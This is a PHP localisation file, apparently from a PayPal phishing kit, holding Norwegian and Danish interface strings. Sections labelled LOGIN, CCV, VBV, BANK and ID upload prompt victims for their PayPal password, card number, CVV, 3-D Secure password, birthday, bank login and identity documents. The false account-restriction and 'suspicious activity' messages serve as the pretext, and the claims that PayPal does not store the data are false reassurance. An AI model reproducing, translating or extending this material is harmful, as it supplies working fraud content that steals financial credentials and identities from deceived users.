<?php
#LOGIN
$wiz_111 = 'Logg inn på din PayPal-konto';
$wiz_222 = 'Har du problemer med å logge inn?';
$wiz_333 = 'Melde deg på';
$wiz_444 = 'Alle rettigheter forbeholdt PayPal Inc';
$wiz_900 = 'E-post';
$wiz_901 = 'Passord';
$wiz_902 = 'Logg inn';
#INFO
$wiz_555 = 'Profil';
$wiz_666 = 'Oppdater bilde';
$wiz_777 = 'Hei igjen!';
$wiz_888 = 'PayPal-konto har vært begrenset!';
$wiz_999 = 'Nødvendig informasjon';
$wiz_903 = 'Fornavn';
$wiz_904 = 'Etternavn';
$wiz_905 = 'Adresse';
$wiz_906 = 'City';
$wiz_907 = 'Tilstand';
$wiz_910 = 'ZIP';
$wiz_911 = 'Telefonnummer';

#-----NAV
$wiz_101 = 'Sammendrag';
$wiz_102 = 'Aktivitet';
$wiz_103 = 'Overføre';
$wiz_104 = 'Lommebok';
$wiz_105 = 'magazines';
$wiz_106 = 'Logg ut';
$wiz_107 = 'Hovedmeny';
$wiz_108 = 'Konto';
$wiz_109 = 'Sikkerhet';
$wiz_112 = 'betalinger';
$wiz_113 = 'Varsler';
#------FOOTER
$wiz_114 = 'HJELP / KONTAKT OSS';
$wiz_115 = 'SIKKERHET';
$wiz_116 = 'Alle rettigheter reservert.';
$wiz_117 = 'Respect for privacy';
$wiz_118 = 'juridiske avtaler';
$wiz_119 = 'kommentarer';
#-------CCV
$wiz_120 = 'Kredittkort';
$wiz_121 = 'Navn på kort';
$wiz_123 = 'Kortnummer';
$wiz_124 = "Exp.";
$wiz_125 = 'CVV (3-4) code';
$wiz_126 = 'Adresselinje';
$wiz_127 = 'Bekreft og Prosesser';
#--------VBV
$wiz_128 = 'Velkommen til Kontroll™';
$wiz_129 = 'Fyll inn informasjonen nedenfor for å bekrefte identiteten din.';
$wiz_130 = 'Kortet utløper:';
$wiz_131 = 'Kortet valideringskoden:';
$wiz_132 = 'Bursdag:';
$wiz_133 = 'Passord eller Secure(3d) :';
$wiz_134 = 'Alle rettigheter reservert.';
#--------BANK
$wiz_135 = 'Velg fra en av disse commun banker';
$wiz_136 = 'Sikre';
$wiz_137 = 'Jeg har en annen bank';
$wiz_138 = "Det er trygt å dele denne informasjonen. PayPal lagrer ikke det.";
$wiz_139 = 'ved å klikke';
$wiz_140 = 'Fortsette';
$wiz_141 = 'Jeg godtar vilkårene for å knytte min bankkonto.';
$wiz_142 = 'din Bank';
$wiz_143 = "Det er trygt å dele denne informasjonen. PayPal lagrer ikke det.";
$wiz_144 = 'Username';
$wiz_145 = 'Passord';
$wiz_146 = 'ved å klikke';
$wiz_147 = 'Fortsette';
$wiz_148 = 'Jeg godtar vilkårene for å knytte min bankkonto.';
$wiz_149 = 'din Bank';
$wiz_150 = 'navn Bank';
#--------Loading AND Police
$wiz_151 = 'Behandling';
$wiz_152 = 'Mistenkelige aktiviteter - Paypal';
$wiz_153 = 'For å beskytte kontoen din vi jevnlig se etter tidlige tegn på potensielt svindelforsøk .';
$wiz_154 = 'Vi er bekymret for potensielle uautorisert aktivitet';
$wiz_155 = 'Når du har bekreftet din identitet, vil vi gå gjennom trinnene for å gjøre kontoen din sikrere.';
$wiz_156 = 'Logg fra Ukjent enhet';
$wiz_157 = 'nær Ossining, USA';
$wiz_158 = 'Bare for å være trygge, ønsker vi å sørge for at dette er din konto.';
$wiz_159 = 'Kontakt';
$wiz_160 = 'Sikkerhet';
$wiz_161 = 'Logg ut';
$wiz_162 = 'Følgende trinn må du helt fylt det å opprettholde sikkerheten til kontoen din over, og at han ikke er et gjennombrudd';
#--------UPLOAD CART ID
$wiz_163 = 'Bekræft din identitet';
$wiz_164 = 'Vælge';
$wiz_165 = 'Upload legitimation (anbefales)';
$wiz_166 = 'Modtag en tekst';
$wiz_167 = 'Modtag en automatisk telefonopkald';
$wiz_168 = 'Fejl denne indstilling ikke tilgængelig for et øjeblik Prøv andre muligheder';
$wiz_169 = 'Hvilken type dokument du vil uploade?';
$wiz_170 = 'krav Vis fil';
$wiz_171 = 'Filer skal være mindre end 10 MB.';
$wiz_172 = 'Brug en af disse filtyper: JPG, GIF, PNG eller PDF.';
$wiz_173 = 'Upload filer, der viser up-to-date og læselige detaljer.';
$wiz_174 = 'Vælg en hvilken som helst';
$wiz_175 = "Kørekort";
$wiz_176 = 'Pas';
$wiz_177 = 'Militær ID';
?>